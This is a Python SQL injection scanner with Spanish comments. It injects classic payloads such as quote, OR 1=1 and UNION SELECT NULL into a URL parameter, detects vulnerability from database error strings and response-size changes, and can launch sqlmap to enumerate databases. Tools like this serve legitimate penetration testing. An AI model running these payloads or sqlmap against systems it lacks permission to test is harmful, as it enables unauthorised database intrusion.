#!/usr/bin/env python3
"""
sqli_scanner.py -- Detector de SQL Injection
Uso:
    python3 sqli_scanner.py --url "http://objetivo.com/item?id=1"
    python3 sqli_scanner.py --url "http://objetivo.com/item?id=1" --sqlmap
"""
import argparse, subprocess, time, urllib.request, urllib.error, urllib.parse

class C:
    RED="[91m";GREEN="[92m";YELLOW="[93m"
    BLUE="[94m";BOLD="[1m";RESET="[0m"

def ok(m):   print(C.GREEN+"  [+] "+C.RESET+m)
def info(m): print(C.BLUE+"  [*] "+C.RESET+m)
def warn(m): print(C.YELLOW+"  [!] "+C.RESET+m)
def crit(m): print(C.RED+C.BOLD+"  [VULNERABLE] "+C.RESET+m)

SQLI_PAYLOADS = [
    ("quote",          "'"),
    ("or_true",        "' OR '1'='1"),
    ("comment_dash",   "' OR 1=1--"),
    ("comment_hash",   "' OR 1=1#"),
    ("union_null",     "' UNION SELECT NULL--"),
    ("and_true",       "' AND 1=1--"),
    ("and_false",      "' AND 1=2--"),
]

SQL_ERRORS = [
    "sql syntax","mysql_fetch","mysqli_fetch","pg_query",
    "sqlite_","ora-","microsoft ole db","sql server",
    "unclosed quotation","quoted string not properly terminated",
    "warning: mysql","you have an error in your sql",
    "division by zero","supplied argument is not a valid mysql",
]

def fetch(url):
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            content = r.read().decode("utf-8","ignore").lower()
            return r.status, content, len(content)
    except urllib.error.HTTPError as e:
        return e.code, "", 0
    except Exception:
        return None, "", 0

def inject_url(base_url, payload):
    if "=" in base_url:
        parts = base_url.rsplit("=", 1)
        return parts[0] + "=" + urllib.parse.quote(parts[1] + payload, safe="")
    return base_url + urllib.parse.quote(payload, safe="")

def banner():
    print("[91m[1m")
    print("  ╔═══════════════════════════════════════════╗")
    print("  ║   SQLI SCANNER -- SQL Injection Detector  ║")
    print("  ╚═══════════════════════════════════════════╝")
    print("[0m")

def main():
    banner()
    p = argparse.ArgumentParser()
    p.add_argument("--url",    required=True, help="URL con parametro a testear")
    p.add_argument("--sqlmap", action="store_true", help="Lanzar sqlmap si es vulnerable")
    args = p.parse_args()

    info("Objetivo: "+args.url)
    print()

    # Peticion base
    base_code, base_content, base_size = fetch(args.url)
    info("Respuesta base: "+str(base_code)+" ("+str(base_size)+" bytes)")
    print()

    vulnerable = False
    findings   = []

    for name, payload in SQLI_PAYLOADS:
        test_url = inject_url(args.url, payload)
        code, content, size = fetch(test_url)
        if code is None:
            continue

        # Detectar por error SQL en la respuesta
        for err in SQL_ERRORS:
            if err in content:
                crit("Error SQL detectado con payload: "+payload)
                crit("Patron encontrado: "+err)
                crit("URL: "+test_url)
                vulnerable = True
                findings.append(("error_based", payload, test_url))
                break

        # Detectar por diferencia de tamano (blind)
        if abs(size - base_size) > 200:
            warn("Diferencia de tamano con '"+name+"': "+str(size)+" vs "+str(base_size)+" bytes")

    if not vulnerable:
        info("No se detectaron errores SQL visibles")
        info("Puede ser Blind SQLi -- probar con sqlmap para confirmarlo")
    
    print()
    print("  "+"="*55)
    info("Probar manualmente con sqlmap:")
    print('  sqlmap -u "'+args.url+'" --batch --level=3')
    print('  sqlmap -u "'+args.url+'" --batch --dbs')
    
    if args.sqlmap and vulnerable:
        info("Lanzando sqlmap...")
        subprocess.run(["sqlmap", "-u", args.url, "--batch", "--dbs"])

if __name__ == "__main__":
    main()
